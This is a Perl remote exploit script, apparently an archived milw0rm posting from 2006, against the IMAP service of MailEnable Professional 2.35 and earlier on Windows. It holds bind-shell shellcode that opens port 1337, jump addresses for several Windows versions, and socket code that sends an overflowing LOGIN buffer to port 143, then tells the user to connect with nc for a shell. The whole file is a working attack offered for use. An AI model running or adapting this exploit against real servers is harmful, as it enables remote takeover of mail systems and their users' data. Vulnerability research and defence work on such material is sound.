#!/usr/bin/perl
#
# maildisable-v6.pl
#
# Mail Enable Professional <=v2.35 (win32) remote exploit
# by mu-b - Tue Dec 5 2006
#
# - Tested on: Mail Enable Professional v2.35 (win32)
#
# Note: timing is quite critical with this!!, so change $send_delay
#       if it doesn't work....
#
########

use Getopt::Std; getopts('t:n:', \%arg);
use Socket;

# metasploit win32 bindshell port 1337
my $zshell_win32_bind =
  "\x33\xc9\x83\xe9\xb0".
  "\x81\xc4\xd0\xfd\xff\xff".
  "\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x1d".
  "\xcc\x32\x69\x83\xeb\xfc\xe2\xf4\xe1\xa6\xd9\x24\xf5\x35\xcd\x96".
  "\xe2\xac\xb9\x05\x39\xe8\xb9\x2c\x21\x47\x4e\x6c\x65\xcd\xdd\xe2".
  "\x52\xd4\xb9\x36\x3d\xcd\xd9\x20\x96\xf8\xb9\x68\xf3\xfd\xf2\xf0".
  "\xb1\x48\xf2\x1d\x1a\x0d\xf8\x64\x1c\x0e\xd9\x9d\x26\x98\x16\x41".
  "\x68\x29\xb9\x36\x39\xcd\xd9\x0f\x96\xc0\x79\xe2\x42\xd0\x33\x82".
  "\x1e\xe0\xb9\xe0\x71\xe8\x2e\x08\xde\xfd\xe9\x0d\x96\x8f\x02\xe2".
  "\x5d\xc0\xb9\x19\x01\x61\xb9\x29\x15\x92\x5a\xe7\x53\xc2\xde\x39".
  "\xe2\x1a\x54\x3a\x7b\xa4\x01\x5b\x75\xbb\x41\x5b\x42\x98\xcd\xb9".
  "\x75\x07\xdf\x95\x26\x9c\xcd\xbf\x42\x45\xd7\x0f\x9c\x21\x3a\x6b".
  "\x48\xa6\x30\x96\xcd\xa4\xeb\x60\xe8\x61\x65\x96\xcb\x9f\x61\x3a".
  "\x4e\x9f\x71\x3a\x5e\x9f\xcd\xb9\x7b\xa4\x37\x50\x7b\x9f\xbb\x88".
  "\x88\xa4\x96\x73\x6d\x0b\x65\x96\xcb\xa6\x22\x38\x48\x33\xe2\x01".
  "\xb9\x61\x1c\x80\x4a\x33\xe4\x3a\x48\x33\xe2\x01\xf8\x85\xb4\x20".
  "\x4a\x33\xe4\x39\x49\x98\x67\x96\xcd\x5f\x5a\x8e\x64\x0a\x4b\x3e".
  "\xe2\x1a\x67\x96\xcd\xaa\x58\x0d\x7b\xa4\x51\x04\x94\x29\x58\x39".
  "\x44\xe5\xfe\xe0\xfa\xa6\x76\xe0\xff\xfd\xf2\x9a\xb7\x32\x70\x44".
  "\xe3\x8e\x1e\xfa\x90\xb6\x0a\xc2\xb6\x67\x5a\x1b\xe3\x7f\x24\x96".
  "\x68\x88\xcd\xbf\x46\x9b\x60\x38\x4c\x9d\x58\x68\x4c\x9d\x67\x38".
  "\xe2\x1c\x5a\xc4\xc4\xc9\xfc\x3a\xe2\x1a\x58\x96\xe2\xfb\xcd\xb9".
  "\x96\x9b\xce\xea\xd9\xa8\xcd\xbf\x4f\x33\xe2\x01\xf2\x02\xd2\x09".
  "\x4e\x33\xe4\x96\xcd\xcc\x32\x69";

# ff e4 -> jmp %esp
my @offsets = ( "\xf8\xfe\x5a\x7c", # Win2K Server SP4 KERNEL32.dll 5.0.2195.7099
                "\xe2\x48\xe6\x77", # WinXP SP0 KERNEL32.dll 5.1.2600.0
                "\x06\x38\xe6\x77", # WinXP SP1 KERNEL32.dll 5.1.2600.11061
                "\xd9\xae\x80\x7c", # WinXP SP2 KERNEL32.dll 5.1.2600.21802
                "\x62\x51\xeb\x77", # Win2K3 SP1 KERNEL32.dll 5.2.3790.18300
                "\xef\xbe\xad\xde"  # DoS
              );

&print_header;

my $target;
my $offset;

if (defined($arg{'t'})) { $target = $arg{'t'} }
if (defined($arg{'n'})) { $offset = $arg{'n'} }
if (!(defined($target))) { &usage; }
if (!(defined($offset))) { $offset = 0; }
if ($offset > $#offsets) {
    print("only ".($#offsets+1)." targets known!!\n");
    exit(1);
} else {
    $offset = $offsets[$offset];
}

my $imapd_port = 143;
my $send_delay = 1;

my $NOP = 'A';
my $START_PAD = 547;
my $SHELL_PAD = 12;

if (connect_host($target, $imapd_port)) {
    print("-> * Connected\n");
    $buf = "A001 LOGIN \{24\}";
    send(SOCKET, $buf."\r\n", 0);
    sleep($send_delay);

    print("-> * Sending payload\n");

    send(SOCKET, "AAAAAAAAAAAAAAAAA\{20\}\r\n", 0);
    sleep($send_delay);

    send(SOCKET, "BBBBBBBBBBBBBBBBBB\r\n", 0);
    sleep($send_delay);

    $buf = ($NOP x $START_PAD).# padding
           $offset.            # EIP
           ($NOP x $SHELL_PAD).
           $zshell_win32_bind. # hellcode
           ($NOP x (0x3ff-$START_PAD-$SHELL_PAD-4-length($zshell_win32_bind)));
    send(SOCKET, $buf, 0);

    print("-> * Successfully sent payload!\n");
    print("-> * nc ".$target." 1337 for shell...\n");
}

sub print_header {
    print("MailEnable Pro <=v2.35 remote exploit\n");
    print("by: <mu-b\@digit-labs.org>\n\n");
}

sub usage {
  print(qq(Usage: $0 -t <hostname>

     -t <hostname>    : hostname to test
     -n <num>         : return addy offset number
));

    exit(1);
}

sub connect_host {
    ($target, $port) = @_;
    $iaddr  = inet_aton($target)                 || die("Error: $!\n");
    $paddr  = sockaddr_in($port, $iaddr)         || die("Error: $!\n");
    $proto  = getprotobyname('tcp')              || die("Error: $!\n");

    socket(SOCKET, PF_INET, SOCK_STREAM, $proto) || die("Error: $!\n");
    connect(SOCKET, $paddr)                      || die("Error: $!\n");
    return(1338);
}

# milw0rm.com [2007-02-16]
